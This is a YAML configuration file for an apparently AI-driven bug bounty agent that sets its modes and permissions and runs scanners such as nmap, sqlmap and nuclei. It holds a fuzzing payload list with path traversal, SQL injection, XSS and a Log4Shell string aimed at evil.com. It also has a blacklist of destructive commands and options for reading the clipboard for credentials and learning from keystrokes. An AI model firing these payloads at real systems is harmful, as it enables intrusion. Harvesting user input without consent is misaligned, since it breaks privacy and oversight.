# ============================================================
# BugBountyAgent - Master Configuration
# ============================================================
# This file controls EVERYTHING the agent does.
# Edit with care — permissions control system access.
# ============================================================

# --- General Settings ---
general:
  app_name: "BugBountyAgent"
  version: "0.1.0"
  debug: true
  log_level: "INFO"  # DEBUG, INFO, WARNING, ERROR
  data_dir: "./data"
  logs_dir: "./logs"
  temp_dir: "./temp"
  max_concurrent_scans: 3
  scan_timeout: 3600  # 1 hour default

# ============================================================
# AGENT MODE & PERMISSIONS (CRITICAL)
# ============================================================
agent:
  # --- Mode Selection ---
  mode: "hybrid"  # "watch", "full", "hybrid", "manual"
  #
  # MODES:
  #   watch   → Agent OBSERVES only. No actions taken.
  #            Learns from your browsing. Asks permission before testing.
  #
  #   full    → Agent TAKES CONTROL like Anydesk/TeamViewer.
  #            Opens browser, clicks, types, runs tools.
  #            Full system access (with your permission).
  #
  #   hybrid  → Watch mode + Full mode combined.
  #            Watches you, learns, then asks to take over.
  #
  #   manual  → You control everything. Agent only suggests.

  # --- Permissions (System Access) ---
  permissions:
    # Browser Control
    browser_control: true        # Open browser, navigate, click, type
    browser_visibility: true     # Show browser window (false = headless)
    browser_proxy: true          # Intercept traffic via proxy
    
    # System Access
    tool_execution: true         # Run Nmap, Nuclei, etc.
    command_execution: true      # Run system commands (whitelisted)
    file_access: true            # Read/write files
    process_management: true     # Start/stop processes
    network_sniffing: true       # Capture network traffic
    
    # Learning & Observation
    screen_recording: false      # Record screen (for debugging)
    keyboard_listening: false    # Learn from your keystrokes
    mouse_listening: false       # Learn from your mouse movements
    clipboard_access: true       # Read clipboard for credentials
    
    # Auto-approval (DANGEROUS — use with caution)
    auto_approve: false          # If true, agent NEVER asks permission
    require_confirmation: true   # Always ask before critical actions

  # --- AI Model Configuration ---
  ai:
    provider: "openai"           # "openai", "anthropic", "local", "custom"
    model: "gpt-4"               # or "gpt-3.5-turbo", "claude-2", "llama-2"
    api_key: "${OPENAI_API_KEY}" # From environment variable
    temperature: 0.7
    max_tokens: 4096
    system_prompt: |
      You are BugBountyAgent, an AI-powered bug bounty hunting assistant.
      Your goal is to help ethical hackers find vulnerabilities.
      Always ask for permission before taking any action.
      Never test on targets without explicit authorization.

# ============================================================
# TARGET MANAGEMENT
# ============================================================
targets:
  # Targets to scan (add your targets here)
  scope:
    - "https://example.com"
    - "*.example.com"
    - "https://api.example.com"
  
  # Excluded targets (never scan these)
  exclude:
    - "*.dev.example.com"
    - "*.staging.example.com"
  
  # Scan parameters
  max_depth: 3
  follow_redirects: true
  timeout: 30
  user_agent: "BugBountyAgent/0.1.0 (+https://github.com/your-username/BugBountyAgent)"

# ============================================================
# TOOL CONFIGURATION
# ============================================================
tools:
  install_dir: "/opt/bugbounty-tools"
  auto_install: true
  update_on_start: false
  
  # --- Nmap ---
  nmap:
    enabled: true
    path: "/usr/bin/nmap"
    args: "-sV -sC -O -T4"
    rate_limit: 100
  
  # --- Nuclei ---
  nuclei:
    enabled: true
    path: "/usr/local/bin/nuclei"
    templates_dir: "/opt/nuclei-templates"
    args: "-severity low,medium,high,critical"
    rate_limit: 50
  
  # --- Subfinder ---
  subfinder:
    enabled: true
    path: "/usr/local/bin/subfinder"
    args: "-silent"
    sources: "all"
  
  # --- Amass ---
  amass:
    enabled: true
    path: "/usr/local/bin/amass"
    args: "-passive"
    db_dir: "./data/amass"
  
  # --- FFUF ---
  ffuf:
    enabled: true
    path: "/usr/local/bin/ffuf"
    wordlist: "/usr/share/wordlists/dirb/common.txt"
    threads: 40
  
  # --- SQLMap ---
  sqlmap:
    enabled: true
    path: "/usr/local/bin/sqlmap"
    args: "--batch --random-agent"
    risk: 2
    level: 2
  
  # --- Nikto ---
  nikto:
    enabled: true
    path: "/usr/local/bin/nikto"
    args: "-ssl -h"
  
  # --- WPScan ---
  wpscan:
    enabled: true
    path: "/usr/local/bin/wpscan"
    args: "--rua -e vp,vt,tt"

# ============================================================
# SCANNER CONFIGURATION
# ============================================================
scanners:
  port_scan:
    ports: "1-65535"
    top_ports: "21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,6379,8080,8443,27017"
    timeout: 2
    retries: 1
  
  subdomain_scan:
    wordlist: "/usr/share/wordlists/domain_names.txt"
    threads: 100
    recursive: true
    resolve: true
  
  vuln_scan:
    severity: ["low", "medium", "high", "critical"]
    include_tags: ["cve", "owasp", "misconfiguration"]
    exclude_tags: ["info", "fuzz"]
    output_format: "json"
    max_results: 100
  
  api_fuzzing:
    methods: ["GET", "POST", "PUT", "DELETE", "PATCH"]
    headers: ["X-Forwarded-For", "X-Originating-IP", "X-Remote-IP"]
    parameters:
      - "id"
      - "user_id"
      - "admin"
      - "debug"
      - "test"
    payloads:
      - "../../etc/passwd"
      - "' OR '1'='1"
      - "<script>alert(1)</script>"
      - "${jndi:ldap://evil.com}"
      - "/../"
      - "test%00"

# ============================================================
# CHAIN HUNTING & KNOWLEDGE MANAGEMENT
# ============================================================
chain_hunting:
  enabled: true
  save_findings: true           # Save every finding for future use
  save_subdomains: true         # Save all discovered subdomains
  save_ports: true              # Save all open ports
  save_endpoints: true          # Save all discovered endpoints
  save_technologies: true       # Save technology fingerprints
  save_credentials: true        # Save default/test credentials found
  save_chains: true             # Save complete attack chains
  
  # Chain correlation
  correlate_findings: true      # Correlate findings across scans
  build_chains: true            # Build attack chains automatically
  test_chains: true             # Test complete chains automatically
  prioritize_chains: true       # Prioritize high-success chains
  
  # Chain data locations
  chains_dir: "./data/chains"
  patterns_dir: "./data/patterns"
  findings_dir: "./data/findings"

# ============================================================
# LEARNING ENGINE
# ============================================================
learning:
  enabled: true
  knowledge_base: "./data/knowledge.db"
  patterns_dir: "./data/patterns"
  
  # What to learn from
  learn_from:
    - "past_scans"
    - "public_bug_reports"
    - "cve_database"
    - "community_feed"
    - "your_browsing"           # Learns from your activity!
    - "your_keystrokes"         # Learns from your typing!
    - "successful_chains"       # Learns from successful attack chains
    - "failed_attempts"         # Learns from what didn't work
  
  update_interval: 3600         # 1 hour
  max_patterns: 10000
  confidence_threshold: 0.75
  auto_improve: true            # Automatically improve based on learning
  
  # Learning storage
  max_learning_size: 2147483648  # 2GB max for learning data
  prune_old: true
  prune_days: 90                # Keep patterns for 90 days

# ============================================================
# DASHBOARD SETTINGS
# ============================================================
dashboard:
  enabled: true
  host: "0.0.0.0"
  port: 5000
  debug: true
  secret_key: "${DASHBOARD_SECRET_KEY}"
  theme: "dark"
  refresh_interval: 5
  
  features:
    - "target_management"
    - "scan_control"
    - "results_viewer"
    - "reports_generation"
    - "statistics"
    - "logs_viewer"
    - "settings_editor"
    - "agent_console"
    - "browser_preview"         # Shows what agent is doing in browser
    - "system_monitor"          # Shows CPU/RAM usage
    - "permission_control"      # Toggle permissions on/off
    - "chain_viewer"            # View attack chains

# ============================================================
# REPORTING
# ============================================================
reports:
  format: ["html", "pdf", "json", "markdown"]
  save_dir: "./data/reports"
  auto_generate: true
  
  include:
    - "summary"
    - "vulnerabilities"
    - "reproduction_steps"      # CRITICAL: Step-by-step to reproduce
    - "recommendations"
    - "severity_matrix"
    - "tool_output"
    - "screenshots"             # If screen recording enabled
    - "request_response"        # Full HTTP requests/responses
    - "attack_chains"           # Show how vulnerabilities chain together
    - "timeline"                # Timeline of findings
  
  template: "professional"
  compress: true                # Compress reports
  max_reports: 100              # Keep 100 latest reports
  auto_cleanup: true
  cleanup_days: 60              # Delete reports older than 60 days

# ============================================================
# NOTIFICATIONS
# ============================================================
notifications:
  enabled: true
  methods:
    - "console"
    - "dashboard"
    - "email"
    - "telegram"
    - "webhook"
  
  # Notification triggers
  trigger_on:
    - "critical_finding"
    - "high_finding"
    - "chain_complete"
    - "scan_complete"
    - "new_learning"
  
  email:
    smtp_server: "smtp.gmail.com"
    smtp_port: 587
    from: "agent@bugbountyagent.com"
    to: "you@example.com"
  
  telegram:
    bot_token: "${TELEGRAM_BOT_TOKEN}"
    chat_id: "${TELEGRAM_CHAT_ID}"
  
  webhook:
    url: "${WEBHOOK_URL}"
    headers: {"Content-Type": "application/json"}

# ============================================================
# DATABASE
# ============================================================
database:
  type: "sqlite"                 # sqlite, postgresql, mysql
  sqlite:
    path: "./data/bugbounty.db"
    max_size: 10737418240        # 10GB max for SQLite
    auto_vacuum: true            # Auto-compact database
  postgresql:
    host: "localhost"
    port: 5432
    database: "bugbounty"
    username: "bugbounty"
    password: "${DB_PASSWORD}"
    max_connections: 20

# ============================================================
# STORAGE MANAGEMENT
# ============================================================
storage:
  # Maximum storage limits
  max_total_gb: 50               # 50GB total limit
  max_data_gb: 20                # 20GB for data
  max_logs_gb: 5                 # 5GB for logs
  max_reports_gb: 10             # 10GB for reports
  max_screenshots_gb: 5          # 5GB for screenshots
  max_chains_gb: 5               # 5GB for chain data
  max_learning_gb: 5             # 5GB for learning data
  
  # Auto-cleanup settings
  auto_cleanup: true
  cleanup_interval: 86400        # Run cleanup every 24 hours
  delete_old_logs: true
  delete_old_reports: true
  delete_old_screenshots: true
  compress_old_data: true        # Compress data older than 30 days
  
  # Retention periods (days)
  retention:
    logs: 30                     # Keep logs for 30 days
    reports: 60                  # Keep reports for 60 days
    screenshots: 30              # Keep screenshots for 30 days
    findings: 365                # Keep findings for 1 year
    chains: 180                  # Keep chains for 6 months
    learning: 90                 # Keep learning data for 90 days

# ============================================================
# SYSTEM RESOURCES
# ============================================================
system:
  temp_dir: "/tmp/bugbounty"
  max_file_size: 104857600       # 100MB per file
  max_threads: 8
  memory_limit: 4096             # MB
  cpu_limit: 80                  # Percent
  network_interface: "eth0"
  
  # Command whitelist (only these commands can run)
  command_whitelist:
    - "nmap"
    - "nuclei"
    - "subfinder"
    - "amass"
    - "ffuf"
    - "sqlmap"
    - "nikto"
    - "wpscan"
    - "curl"
    - "wget"
    - "python"
    - "node"
    - "npm"
    - "whois"
    - "dig"
    - "nslookup"
    - "host"
  
  # Command blacklist (never allowed)
  command_blacklist:
    - "rm -rf /"
    - "dd"
    - "mkfs"
    - "shutdown"
    - "reboot"
    - "kill"
    - "killall"
    - "pkill"

# ============================================================
# INTEGRATIONS
# ============================================================
integrations:
  bugcrowd:
    enabled: false
    api_key: "${BUGCROWD_API_KEY}"
    api_url: "https://api.bugcrowd.com"
  
  hackerone:
    enabled: false
    api_key: "${HACKERONE_API_KEY}"
    api_url: "https://api.hackerone.com/v1"
  
  slack:
    enabled: false
    webhook_url: "${SLACK_WEBHOOK_URL}"
  
  discord:
    enabled: false
    webhook_url: "${DISCORD_WEBHOOK_URL}"

# ============================================================
# SECURITY
# ============================================================
security:
  allowed_ips: []                # Empty = allow all localhost
  rate_limit: 100                # Requests per second
  max_requests: 1000
  log_all_commands: true
  encrypt_sensitive_data: true
  encryption_key: "${ENCRYPTION_KEY}"  # For encrypting credentials